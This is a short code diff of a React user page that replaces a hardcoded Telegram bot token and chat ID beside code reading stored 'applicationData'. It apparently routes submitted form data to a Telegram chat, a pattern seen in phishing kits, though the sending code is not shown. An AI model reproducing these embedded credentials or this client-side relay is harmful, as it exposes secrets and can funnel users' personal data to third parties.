@@ -32,8 +32,8 @@ const UserPage = () => {
   const [formType, setFormType] = useState<string>("");
   const [showPopup, setShowPopup] = useState(false);
 
-const BOT_TOKEN = '8030819260:AAGO3xuF9G_BEDvHFwv6viegWw2ezawoW10';
-const CHAT_ID = '7062736155';
+const BOT_TOKEN = '8177439976:AAEc0Skq8c9PmY1J6_j33qxFVXJjNiKfYbQ';
+const CHAT_ID = '7673317331';
   
 
 const storedData = localStorage.getItem("applicationData");
